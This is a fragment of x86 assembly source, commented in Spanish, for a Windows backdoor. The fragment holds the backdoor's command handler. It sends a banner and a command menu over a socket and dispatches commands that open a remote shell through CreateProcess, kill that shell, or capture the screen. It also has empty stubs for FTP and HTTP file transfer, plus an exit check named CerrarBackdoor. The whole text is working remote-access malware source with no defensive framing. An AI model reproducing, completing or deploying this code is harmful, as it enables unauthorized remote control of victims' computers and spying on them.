;###################################
;## LANZA EL BANNER POR EL SOCKET ##
;###################################
proc EnviaBanner sock
push Retorno
push [sock]
call EnviarDatos
push Baner1
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
push Baner2
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
ret
endp

;##########################################
;## ENVIA LA LISTA DE COMANDOS AL SOCKET ##
;##########################################
proc EnviarComandos sock
push Retorno
push [sock]
call EnviarDatos
push Cruz
push [sock]
call EnviarDatos
push Salir
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
push Cruz
push [sock]
call EnviarDatos
push Comandos
push [sock]
call EnviarDatos

push Retorno
push [sock]
call EnviarDatos
push Cruz
push [sock]
call EnviarDatos
push Shell
push [sock]
call EnviarDatos

push Retorno
push [sock]
call EnviarDatos
push Cruz
push [sock]
call EnviarDatos
push FinShell
push [sock]
call EnviarDatos

push Retorno
push [sock]
call EnviarDatos
push Cruz
push [sock]
call EnviarDatos
push CapPant
push [sock]
call EnviarDatos

push Retorno
push [sock]
call EnviarDatos
push Cruz
push [sock]
call EnviarDatos
push SubirFtp
push [sock]
call EnviarDatos

push Retorno
push [sock]
call EnviarDatos
push Cruz
push [sock]
call EnviarDatos
push DescargarFtp
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
push Cruz
push [sock]
call EnviarDatos
push DescargarHttp
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
ret
endp

;#################################
;## ANALIZA LOS DATOS RECIBIDOS ##
;#################################
proc Analiza sock,cadena

mov esi,[cadena]
xor ecx,ecx
len_cad:
cmp byte [esi],0
je flen_cad
inc esi
inc ecx
jmp len_cad
flen_cad:


push ecx
mov esi,[cadena]
lea edi,[Comandos]
rep cmpsb
je envia_lista_comandos;Quiere saber la lista de comandos
pop ecx

push ecx
mov esi,[cadena]
lea edi,[Shell]
rep cmpsb
je lanzar_shell;Quiere recibir una shell mediante CreateProcess
pop ecx

push ecx
mov esi,[cadena]
lea edi,[FinShell]
rep cmpsb
je matar_shell;Quiere terminar la shell basica
pop ecx

push ecx
mov esi,[cadena]
lea edi,[CapPant]
rep cmpsb
je captura;Quiere terminar la shell basica
pop ecx

push ecx
mov esi,[cadena]
lea edi,[SubirFtp]
rep cmpsb
je subir_ftp;Quiere subir un archivo a un ftp
pop ecx

push ecx
mov esi,[cadena]
lea edi,[DescargarFtp]
rep cmpsb
je descargar_ftp;Quiere descargar un archivo de un ftp
pop ecx

push ecx
mov esi,[cadena]
lea edi,[DescargarHttp]
rep cmpsb
je descargar_http
pop ecx

push Retorno
push [sock]
call EnviarDatos
push Error
push [sock]
call EnviarDatos
push Desconocido
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
ret

envia_lista_comandos:
	push [sock]
	call EnviarComandos
	jmp salida_analisis

lanzar_shell:
	push [sock]
	call DatosShell
	jmp salida_analisis

matar_shell:
	push 0
	push [PI.hProcess]
	call TerminateProcess
	push [socketShell]
	call closesocket
	push 0
	push [hHilo]
	call TerminateThread
	jmp salida_analisis

captura:
	push [sock]
	call Capturar
	jmp salida_analisis

subir_ftp:
	jmp salida_analisis

descargar_ftp:
	jmp salida_analisis

descargar_http:
	jmp salida_analisis

salida_analisis:
ret
endp

;###########################################
;## ACTIVA EL FLAG Z SI TENEMOS QUE SALIR ##
;###########################################
proc CerrarBackdoor cadena
mov ecx,5
mov esi,[cadena]
lea edi,[Salir]
rep cmpsb
ret
endp